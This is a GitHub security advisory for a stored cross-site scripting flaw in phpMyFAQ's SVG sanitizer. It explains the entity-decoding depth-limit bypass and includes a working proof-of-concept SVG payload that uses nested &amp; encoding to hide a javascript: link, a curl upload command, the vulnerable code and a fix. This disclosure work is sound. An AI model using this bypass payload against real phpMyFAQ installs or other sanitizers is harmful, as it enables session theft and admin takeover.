# [M] phpMyFAQ has a SVG Sanitizer Entity Decoding Depth Limit Bypass Leading to Stored XSS

## Summary
Severity: Medium
Advisory: GHSA-whqh-9pq5-c7r3
CVE: CVE-2026-46360
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-whqh-9pq5-c7r3
Type: github-advisory

## Affected
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.2
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.2

## Details
## Summary

The `SvgSanitizer::decodeAllEntities()` method limits recursive entity decoding to 5 iterations. By wrapping each character of `javascript` in an `href` attribute value with 5 levels of `&amp;` encoding around numeric HTML entities (e.g., `&amp;amp;amp;amp;amp;#106;` for `j`), an attacker can bypass both `isSafe()` detection and `sanitize()` removal. The uploaded SVG is served from the application origin with `image/svg+xml` content type, and the browser's XML parser fully decodes the remaining `&#NNN;` entities, resulting in a clickable `javascript:` link that executes arbitrary JavaScript.

## Details

**Root cause:** `decodeAllEntities()` at `phpmyfaq/src/phpMyFAQ/Helper/SvgSanitizer.php:223-249` limits entity decoding to `maxIterations=5`. Each iteration: (1) decodes `&#NNN;` numeric entities, (2) decodes `&#xHH;` hex entities, (3) calls `html_entity_decode()` which resolves one level of `&amp;` → `&`. With 5 levels of `&amp;` wrapping, all 5 iterations are consumed unwinding the `&amp;` nesting, leaving the final `&#NNN;` numeric entities unresolved.

**Code path:**

1. Authenticated user with `FAQ_EDIT` permission uploads SVG via `POST /admin/api/content/images` (`ImageController::upload()` at line 39)
2. File extension is `svg` → `SvgSanitizer::isSafe()` called (line 114)
3. `isSafe()` calls `decodeAllEntities()` — 5 iterations resolve `&amp;` nesting but leave `&#106;&#97;...` (numeric entities for `javascript`)
4. Pattern matching at line 47 (`/href\s*=\s*["\'][\s]*javascript\s*:/i`) does **not** match `&#106;&#97;...`
5. `isSafe()` returns **true** — file saved **without any sanitization**
6. SVG served directly by web server from `content/user/images/` with `image/svg+xml` MIME type
7. Browser's XML parser decodes `&#106;` → `j`, `&#97;` → `a`, etc., reconstructing `javascript:alert(document.domain)`
8. User clicks the SVG link → JavaScript executes in the phpMyFAQ origin

The bypass is even simpler than initially described — no `<script>` decoy tag is needed. Since `isSafe()` itself is bypassed, the file is stored without sanitization and the `sanitize()` code path is never reached.

**Relevant code in `decodeAllEntities()`:**

```php
// phpmyfaq/src/phpMyFAQ/Helper/SvgSanitizer.php:223-249
private function decodeAllEntities(string $content): string
{
    $previous = '';
    $decoded = $content;
    $maxIterations = 5;  // <-- insufficient for 5 levels of &amp; + numeric entity

    while ($decoded !== $previous && $maxIterations-- > 0) {
        $previous = $decoded;
        // Step 1: Decode decimal entities (&#106; → j)
        $decoded = preg_replace_callback('/&#(\d+);/', ...);
        // Step 2: Decode hex entities (&#x6A; → j)
        $decoded = preg_replace_callback('/&#x([0-9a-fA-F]+);/', ...);
        // Step 3: Decode named HTML entities (&amp; → &)
        $decoded = html_entity_decode($decoded, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
    // After 5 iterations with 5 &amp; levels: &#106; remains undecoded
    return preg_replace('/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/', '', $decoded);
}
```

## PoC

Upload an SVG file containing a `javascript:` href where each character of `javascript` is entity-encoded with 5 levels of `&amp;` nesting around numeric entities. No `<script>` decoy is required — `isSafe()` itself is bypassed.

**Step 1: Create malicious SVG file (`xss.svg`):**

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
  <a href="&amp;amp;amp;amp;amp;#106;&amp;amp;amp;amp;amp;#97;&amp;amp;amp;amp;amp;#118;&amp;amp;amp;amp;amp;#97;&amp;amp;amp;amp;amp;#115;&amp;amp;amp;amp;amp;#99;&amp;amp;amp;amp;amp;#114;&amp;amp;amp;amp;amp;#105;&amp;amp;amp;amp;amp;#112;&amp;amp;amp;amp;amp;#116;:alert(document.domain)">
    <circle cx="100" cy="100" r="80" fill="red"/>
    <text x="100" y="110" text-anchor="middle" fill="white" font-size="20">Click me</text>
  </a>
</svg>
```

**Step 2: Upload via admin image upload endpoint:**

```bash
curl -b 'session_cookie' \
  -F "files[]=@xss.svg" \
  "https://TARGET/admin/api/content/images?csrf=VALID_TOKEN"
```

Expected response: `{"success": true, ...}` with the uploaded file URL.

**Step 3: Access the uploaded SVG directly:**

```
https://TARGET/content/user/images/1712345678_xss.svg
```

The browser renders the SVG as `image/svg+xml`. The XML parser decodes `&#106;` → `j`, `&#97;` → `a`, etc., producing `href="javascript:alert(document.domain)"`. Clicking the red circle executes JavaScript in the phpMyFAQ origin.

## Impact

- **Stored XSS**: Any user (including other administrators) who views and clicks the malicious SVG link has JavaScript executed in their browser within the phpMyFAQ origin.
- **Session hijacking**: Attacker can steal session cookies and CSRF tokens of other admins.
- **Privilege escalation**: An editor-level user can execute JavaScript as a super-admin who views the image, potentially gaining full administrative control.
- **Data exfiltration**: Access to all FAQ content, user data, and configuration accessible through the admin interface.

The blast radius is limited by the requirement that a victim must click the link within the SVG. However, the SVG can be crafted to make the clickable area cover the entire visible image (as shown in the PoC), and the attacker controls the visual appearance.

## Recommended Fix

The root cause is that `decodeAllEntities()` can be exhausted by deeply nested `&amp;` encoding. The fix should ensure that after the decoding loop exits, a final pass of numeric/hex entity decoding is performed:

```php
// phpmyfaq/src/phpMyFAQ/Helper/SvgSanitizer.php - decodeAllEntities()
private function decodeAllEntities(string $content): string
{
    $previous = '';
    $decoded = $content;
    $maxIterations = 10; // Increase from 5 to handle deeper nesting

    while ($decoded !== $previous && $maxIterations-- > 0) {
        $previous = $decoded;
        $decoded = preg_replace_callback(
            '/&#(\d+);/',
            static fn(array $matches): string => mb_chr((int) $matches[1], encoding: 'UTF-8'),
            $decoded,
        );
        $decoded = preg_replace_callback(
            '/&#x([0-9a-fA-F]+);/',
            static fn(array $matches): string => mb_chr(hexdec($matches[1]), encoding: 'UTF-8'),
            $decoded,
        );
        $decoded = html_entity_decode($decoded, ENT_QUOTES | ENT_HTML5, encoding: 'UTF-8');
    }

    // Safety net: if the loop exited due to iteration limit, do a final
    // numeric/hex entity decode pass to catch any remaining &#NNN; entities
    $decoded = preg_replace_callback(
        '/&#(\d+);/',
        static fn(array $matches): string => mb_chr((int) $matches[1], encoding: 'UTF-8'),
        $decoded,
    );
    $decoded = preg_replace_callback(
        '/&#x([0-9a-fA-F]+);/',
        static fn(array $matches): string => mb_chr(hexdec($matches[1]), encoding: 'UTF-8'),
        $decoded,
    );

    return preg_replace('/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/', replacement: '', subject: $decoded);
}
```

Additionally, consider serving uploaded SVG files with `Content-Disposition: attachment` or `Content-Type: application/octet-stream` to prevent browser rendering, as a defense-in-depth measure.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-whqh-9pq5-c7r3
- https://nvd.nist.gov/vuln/detail/CVE-2026-46360
- https://github.com/thorsten/phpMyFAQ
- https://www.vulncheck.com/advisories/phpmyfaq-stored-xss-via-entity-decoding-depth-limit-bypass-in-svg-sanitizer
